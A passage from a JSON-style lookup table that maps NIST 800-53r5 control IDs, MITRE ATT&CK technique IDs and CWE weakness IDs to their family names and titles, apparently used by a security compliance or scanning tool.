      "family": "NIST 800-53r5",
      "title": "Event Logging"
    },
    "AU-3": {
      "family": "NIST 800-53r5",
      "title": "Content of Audit Records"
    },
    "AU-3(1)": {
      "family": "NIST 800-53r5",
      "title": "Content of Audit Records | Additional Audit Information"
    },
    "AU-3(3)": {
      "family": "NIST 800-53r5",
      "title": "Content of Audit Records | Limit Personally Identifiable Information Elements"
    },
    "AU-4": {
      "family": "NIST 800-53r5",
      "title": "Audit Log Storage Capacity"
    },
    "AU-5": {
      "family": "NIST 800-53r5",
      "title": "Response to Audit Logging Process Failures"
    },
    "AU-5(1)": {
      "family": "NIST 800-53r5",
      "title": "Response to Audit Logging Process Failures | Storage Capacity Warning"
    },
    "AU-5(2)": {
      "family": "NIST 800-53r5",
      "title": "Response to Audit Logging Process Failures | Real-time Alerts"
    },
    "AU-6": {
      "family": "NIST 800-53r5",
      "title": "Audit Record Review, Analysis, and Reporting"
    },
    "AU-8": {
      "family": "NIST 800-53r5",
      "title": "Time Stamps"
    },
    "AU-8(1)": {
      "family": "NIST 800-53r5",
      "title": "Time Stamps | Synchronization with Authoritative Time Source"
    },
    "AU-9": {
      "family": "NIST 800-53r5",
      "title": "Protection of Audit Information"
    },
    "AU-9(2)": {
      "family": "NIST 800-53r5",
      "title": "Protection of Audit Information | Store on Separate Physical Systems or Components"
    },
    "AU-9(3)": {
      "family": "NIST 800-53r5",
      "title": "Protection of Audit Information | Cryptographic Protection"
    },
    "AU-9(4)": {
      "family": "NIST 800-53r5",
      "title": "Protection of Audit Information | Access by Subset of Privileged Users"
    },
    "AU-9(6)": {
      "family": "NIST 800-53r5",
      "title": "Protection of Audit Information | Read-only Access"
    },
    "CM-2": {
      "family": "NIST 800-53r5",
      "title": "Baseline Configuration"
    },
    "CM-2(2)": {
      "family": "NIST 800-53r5",
      "title": "Baseline Configuration | Automation Support for Accuracy and Currency"
    },
    "CM-3": {
      "family": "NIST 800-53r5",
      "title": "Configuration Change Control"
    },
    "CM-3(1)": {
      "family": "NIST 800-53r5",
      "title": "Configuration Change Control | Automated Documentation, Notification, and Prohibition of Changes"
    },
    "CM-5": {
      "family": "NIST 800-53r5",
      "title": "Access Restrictions for Change"
    },
    "CM-6": {
      "family": "NIST 800-53r5",
      "title": "Configuration Settings"
    },
    "CM-6(1)": {
      "family": "NIST 800-53r5",
      "title": "Configuration Settings | Automated Management, Application, and Verification"
    },
    "CM-6(2)": {
      "family": "NIST 800-53r5",
      "title": "Configuration Settings | Respond to Unauthorized Changes"
    },
    "CM-7": {
      "family": "NIST 800-53r5",
      "title": "Least Functionality"
    },
    "CM-7(5)": {
      "family": "NIST 800-53r5",
      "title": "Least Functionality | Authorized Software — Allow-by-exception"
    },
    "CM-8": {
      "family": "NIST 800-53r5",
      "title": "System Component Inventory"
    },
    "CP-10": {
      "family": "NIST 800-53r5",
      "title": "System Recovery and Reconstitution"
    },
    "CP-10(2)": {
      "family": "NIST 800-53r5",
      "title": "System Recovery and Reconstitution | Transaction Recovery"
    },
    "CP-12": {
      "family": "NIST 800-53r5",
      "title": "Safe Mode"
    },
    "CP-13": {
      "family": "NIST 800-53r5",
      "title": "Alternative Security Mechanisms"
    },
    "CP-2": {
      "family": "NIST 800-53r5",
      "title": "Contingency Plan"
    },
    "CP-2(3)": {
      "family": "NIST 800-53r5",
      "title": "Contingency Plan | Resume Mission and Business Functions"
    },
    "CP-2(5)": {
      "family": "NIST 800-53r5",
      "title": "Contingency Plan | Continue Mission and Business Functions"
    },
    "CP-7": {
      "family": "NIST 800-53r5",
      "title": "Alternate Processing Site"
    },
    "CP-9": {
      "family": "NIST 800-53r5",
      "title": "System Backup"
    },
    "CP-9(1)": {
      "family": "NIST 800-53r5",
      "title": "System Backup | Testing for Reliability and Integrity"
    },
    "CP-9(8)": {
      "family": "NIST 800-53r5",
      "title": "System Backup | Cryptographic Protection"
    },
    "IA-2": {
      "family": "NIST 800-53r5",
      "title": "Identification and Authentication (Organizational Users)"
    },
    "IA-2(1)": {
      "family": "NIST 800-53r5",
      "title": "Identification and Authentication (Organizational Users) | Multi-factor Authentication to Privileged Accounts"
    },
    "IA-2(2)": {
      "family": "NIST 800-53r5",
      "title": "Identification and Authentication (Organizational Users) | Multi-factor Authentication to Non-privileged Accounts"
    },
    "IA-2(6)": {
      "family": "NIST 800-53r5",
      "title": "Identification and Authentication (Organizational Users) | Access to Accounts —separate Device"
    },
    "IA-2(8)": {
      "family": "NIST 800-53r5",
      "title": "Identification and Authentication (Organizational Users) | Access to Accounts — Replay Resistant"
    },
    "IA-3": {
      "family": "NIST 800-53r5",
      "title": "Device Identification and Authentication"
    },
    "IA-3(1)": {
      "family": "NIST 800-53r5",
      "title": "Device Identification and Authentication | Cryptographic Bidirectional Authentication"
    },
    "IA-5": {
      "family": "NIST 800-53r5",
      "title": "Authenticator Management"
    },
    "IA-5(1)": {
      "family": "NIST 800-53r5",
      "title": "Authenticator Management | Password-based Authentication"
    },
    "IA-5(13)": {
      "family": "NIST 800-53r5",
      "title": "Authenticator Management | Expiration of Cached Authenticators"
    },
    "IA-5(2)": {
      "family": "NIST 800-53r5",
      "title": "Authenticator Management | Public Key-based Authentication"
    },
    "IA-5(7)": {
      "family": "NIST 800-53r5",
      "title": "Authenticator Management | No Embedded Unencrypted Static Authenticators"
    },
    "IA-9": {
      "family": "NIST 800-53r5",
      "title": "Service Identification and Authentication"
    },
    "IR-4": {
      "family": "NIST 800-53r5",
      "title": "Incident Handling"
    },
    "MP-4": {
      "family": "NIST 800-53r5",
      "title": "Media Storage"
    },
    "SA-10": {
      "family": "NIST 800-53r5",
      "title": "Developer Configuration Management"
    },
    "SA-15(7)": {
      "family": "NIST 800-53r5",
      "title": "Development Process, Standards, and Tools | Automated Vulnerability Analysis"
    },
    "SC-10": {
      "family": "NIST 800-53r5",
      "title": "Network Disconnect"
    },
    "SC-12": {
      "family": "NIST 800-53r5",
      "title": "Cryptographic Key Establishment and Management"
    },
    "SC-12(1)": {
      "family": "NIST 800-53r5",
      "title": "Cryptographic Key Establishment and Management | Availability"
    },
    "SC-12(2)": {
      "family": "NIST 800-53r5",
      "title": "Cryptographic Key Establishment and Management | Symmetric Keys"
    },
    "SC-13": {
      "family": "NIST 800-53r5",
      "title": "Cryptographic Protection"
    },
    "SC-16": {
      "family": "NIST 800-53r5",
      "title": "Transmission of Security and Privacy Attributes"
    },
    "SC-17": {
      "family": "NIST 800-53r5",
      "title": "Public Key Infrastructure Certificates"
    },
    "SC-22": {
      "family": "NIST 800-53r5",
      "title": "Architecture and Provisioning for Name/Address Resolution Service"
    },
    "SC-23": {
      "family": "NIST 800-53r5",
      "title": "Session Authenticity"
    },
    "SC-23(3)": {
      "family": "NIST 800-53r5",
      "title": "Session Authenticity | Unique System-generated Session Identifiers"
    },
    "SC-28": {
      "family": "NIST 800-53r5",
      "title": "Protection of Information at Rest"
    },
    "SC-28(1)": {
      "family": "NIST 800-53r5",
      "title": "Protection of Information at Rest | Cryptographic Protection"
    },
    "SC-36": {
      "family": "NIST 800-53r5",
      "title": "Distributed Processing and Storage"
    },
    "SC-36(1)": {
      "family": "NIST 800-53r5",
      "title": "Distributed Processing and Storage | Polling Techniques"
    },
    "SC-5": {
      "family": "NIST 800-53r5",
      "title": "Denial-of-service Protection"
    },
    "SC-5(1)": {
      "family": "NIST 800-53r5",
      "title": "Denial-of-service Protection | Restrict Ability to Attack Other Systems"
    },
    "SC-5(2)": {
      "family": "NIST 800-53r5",
      "title": "Denial-of-service Protection | Capacity, Bandwidth, and Redundancy"
    },
    "SC-6": {
      "family": "NIST 800-53r5",
      "title": "Resource Availability"
    },
    "SC-7": {
      "family": "NIST 800-53r5",
      "title": "Boundary Protection"
    },
    "SC-7(21)": {
      "family": "NIST 800-53r5",
      "title": "Boundary Protection | Isolation of System Components"
    },
    "SC-7(5)": {
      "family": "NIST 800-53r5",
      "title": "Boundary Protection | Deny by Default — Allow by Exception"
    },
    "SC-8": {
      "family": "NIST 800-53r5",
      "title": "Transmission Confidentiality and Integrity"
    },
    "SC-8(1)": {
      "family": "NIST 800-53r5",
      "title": "Transmission Confidentiality and Integrity | Cryptographic Protection"
    },
    "SI-10": {
      "family": "NIST 800-53r5",
      "title": "Information Input Validation"
    },
    "SI-10(5)": {
      "family": "NIST 800-53r5",
      "title": "Information Input Validation | Restrict Inputs to Trusted Sources and Approved Formats"
    },
    "SI-12": {
      "family": "NIST 800-53r5",
      "title": "Information Management and Retention"
    },
    "SI-13": {
      "family": "NIST 800-53r5",
      "title": "Predictable Failure Prevention"
    },
    "SI-13(4)": {
      "family": "NIST 800-53r5",
      "title": "Predictable Failure Prevention | Standby Component Installation and Notification"
    },
    "SI-15": {
      "family": "NIST 800-53r5",
      "title": "Information Output Filtering"
    },
    "SI-17": {
      "family": "NIST 800-53r5",
      "title": "Fail-safe Procedures"
    },
    "SI-4": {
      "family": "NIST 800-53r5",
      "title": "System Monitoring"
    },
    "SI-7": {
      "family": "NIST 800-53r5",
      "title": "Software, Firmware, and Information Integrity"
    },
    "SI-7(1)": {
      "family": "NIST 800-53r5",
      "title": "Software, Firmware, and Information Integrity | Integrity Checks"
    },
    "SI-7(8)": {
      "family": "NIST 800-53r5",
      "title": "Software, Firmware, and Information Integrity | Auditing Capability for Significant Events"
    },
    "SR-11": {
      "family": "NIST 800-53r5",
      "title": "Component Authenticity"
    },
    "SR-4": {
      "family": "NIST 800-53r5",
      "title": "Provenance"
    },
    "SR-4(3)": {
      "family": "NIST 800-53r5",
      "title": "Provenance | Validate as Genuine and Not Altered"
    },
    "SR-4(4)": {
      "family": "NIST 800-53r5",
      "title": "Provenance | Supply Chain Integrity — Pedigree"
    },
    "T1070": {
      "family": "MITRE ATT&CK",
      "title": "Indicator Removal"
    },
    "T1078": {
      "family": "MITRE ATT&CK",
      "title": "Valid Accounts"
    },
    "T1110": {
      "family": "MITRE ATT&CK",
      "title": "Brute Force"
    },
    "T1110.001": {
      "family": "MITRE ATT&CK",
      "title": "Brute Force: Password Guessing"
    },
    "T1190": {
      "family": "MITRE ATT&CK",
      "title": "Exploit Public-Facing Application"
    },
    "T1195": {
      "family": "MITRE ATT&CK",
      "title": "Supply Chain Compromise"
    },
    "T1195.002": {
      "family": "MITRE ATT&CK",
      "title": "Supply Chain Compromise: Compromise Software Supply Chain"
    },
    "T1213": {
      "family": "MITRE ATT&CK",
      "title": "Data from Information Repositories"
    },
    "T1490": {
      "family": "MITRE ATT&CK",
      "title": "Inhibit System Recovery"
    },
    "T1499": {
      "family": "MITRE ATT&CK",
      "title": "Endpoint Denial of Service"
    },
    "T1499.003": {
      "family": "MITRE ATT&CK",
      "title": "Endpoint Denial of Service: Application Exhaustion Flood"
    },
    "T1550": {
      "family": "MITRE ATT&CK",
      "title": "Use Alternate Authentication Material"
    },
    "T1550.001": {
      "family": "MITRE ATT&CK",
      "title": "Use Alternate Authentication Material: Application Access Token"
    },
    "T1552": {
      "family": "MITRE ATT&CK",
      "title": "Unsecured Credentials"
    },
    "T1552.001": {
      "family": "MITRE ATT&CK",
      "title": "Unsecured Credentials: Credentials In Files"
    },
    "T1557": {
      "family": "MITRE ATT&CK",
      "title": "Adversary-in-the-Middle"
    },
    "T1562": {
      "family": "MITRE ATT&CK",
      "title": "Impair Defenses"
    },
    "T1562.008": {
      "family": "MITRE ATT&CK",
      "title": "Impair Defenses: Disable or Modify Cloud Logs"
    },
    "T1606": {
      "family": "MITRE ATT&CK",
      "title": "Forge Web Credentials"
    },
    "CWE-1088": {
      "family": "CWE",
      "title": "Synchronous Access of Remote Resource without Timeout"
    },
    "CWE-117": {
      "family": "CWE",
      "title": "Improper Output Neutralization for Logs"
    },
    "CWE-1188": {
      "family": "CWE",
      "title": "Initialization of a Resource with an Insecure Default"
    },
    "CWE-1357": {
      "family": "CWE",
      "title": "Reliance on Insufficiently Trustworthy Component"
    },
    "CWE-20": {
      "family": "CWE",
      "title": "Improper Input Validation"
    },
    "CWE-200": {
      "family": "CWE",
      "title": "Exposure of Sensitive Information to an Unauthorized Actor"
    },
    "CWE-213": {
      "family": "CWE",
      "title": "Exposure of Sensitive Information Due to Incompatible Policies"
    },
    "CWE-22": {
      "family": "CWE",
      "title": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
    },
    "CWE-223": {
      "family": "CWE",
      "title": "Omission of Security-relevant Information"
    },
    "CWE-250": {
      "family": "CWE",
      "title": "Execution with Unnecessary Privileges"
    },
    "CWE-256": {
      "family": "CWE",
      "title": "Plaintext Storage of a Password"
    },
    "CWE-269": {
      "family": "CWE",
      "title": "Improper Privilege Management"
    },
    "CWE-285": {
      "family": "CWE",
      "title": "Improper Authorization"
    },
    "CWE-287": {
      "family": "CWE",
      "title": "Improper Authentication"
    },
    "CWE-306": {
      "family": "CWE",
      "title": "Missing Authentication for Critical Function"
    },
    "CWE-307": {
      "family": "CWE",
      "title": "Improper Restriction of Excessive Authentication Attempts"
    },
    "CWE-308": {
      "family": "CWE",
      "title": "Use of Single-factor Authentication"
    },
    "CWE-311": {
      "family": "CWE",
      "title": "Missing Encryption of Sensitive Data"
    },
    "CWE-312": {
      "family": "CWE",
      "title": "Cleartext Storage of Sensitive Information"
    },
    "CWE-319": {
      "family": "CWE",
      "title": "Cleartext Transmission of Sensitive Information"
    },
    "CWE-321": {
      "family": "CWE",
      "title": "Use of Hard-coded Cryptographic Key"
    },
    "CWE-326": {
      "family": "CWE",
      "title": "Inadequate Encryption Strength"
    },
    "CWE-340": {
      "family": "CWE",
      "title": "Generation of Predictable Numbers or Identifiers"
    },
    "CWE-345": {
      "family": "CWE",
      "title": "Insufficient Verification of Data Authenticity"
    },
    "CWE-347": {
      "family": "CWE",
      "title": "Improper Verification of Cryptographic Signature"
    },
    "CWE-362": {
      "family": "CWE",
      "title": "Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')"
    },
    "CWE-384": {
      "family": "CWE",
      "title": "Session Fixation"
    },
    "CWE-400": {
      "family": "CWE",
      "title": "Uncontrolled Resource Consumption"
    },
    "CWE-405": {
      "family": "CWE",
      "title": "Asymmetric Resource Consumption (Amplification)"
    },
    "CWE-441": {
      "family": "CWE",
      "title": "Unintended Proxy or Intermediary ('Confused Deputy')"
    },
    "CWE-532": {
      "family": "CWE",
      "title": "Insertion of Sensitive Information into Log File"
    },
    "CWE-613": {
      "family": "CWE",
      "title": "Insufficient Session Expiration"
    },
    "CWE-639": {
      "family": "CWE",
      "title": "Authorization Bypass Through User-Controlled Key"
    },
    "CWE-640": {
      "family": "CWE",
      "title": "Weak Password Recovery Mechanism for Forgotten Password"
    },
    "CWE-732": {
      "family": "CWE",
      "title": "Incorrect Permission Assignment for Critical Resource"
    },
    "CWE-754": {
      "family": "CWE",
      "title": "Improper Check for Unusual or Exceptional Conditions"
    },
    "CWE-755": {
      "family": "CWE",
      "title": "Improper Handling of Exceptional Conditions"
    },
    "CWE-77": {
      "family": "CWE",
      "title": "Improper Neutralization of Special Elements used in a Command ('Command Injection')"
    },
    "CWE-770": {
      "family": "CWE",
      "title": "Allocation of Resources Without Limits or Throttling"
    },
    "CWE-778": {
      "family": "CWE",
      "title": "Insufficient Logging"
    },
    "CWE-78": {
      "family": "CWE",
      "title": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
    },
    "CWE-798": {
      "family": "CWE",
      "title": "Use of Hard-coded Credentials"
    },
    "CWE-829": {
      "family": "CWE",
      "title": "Inclusion of Functionality from Untrusted Control Sphere"
    },
    "CWE-840": {
      "family": "CWE",
      "title": "CWE-840"
    },
    "CWE-862": {
      "family": "CWE",
      "title": "Missing Authorization"
    },
    "CWE-89": {
      "family": "CWE",
      "title": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
    },
    "CWE-915": {
      "family": "CWE",
      "title": "Improperly Controlled Modification of Dynamically-Determined Object Attributes"
    },
    "CWE-916": {
      "family": "CWE",
      "title": "Use of Password Hash With Insufficient Computational Effort"
    },
    "CWE-918": {
      "family": "CWE",
      "title": "Server-Side Request Forgery (SSRF)"
    },
    "CWE-94": {
      "family": "CWE",
      "title": "Improper Control of Generation of Code ('Code Injection')"
    },
    "CWE-943": {
      "family": "CWE",
      "title": "Improper Neutralization of Special Elements in Data Query Logic"
    }
  }
};
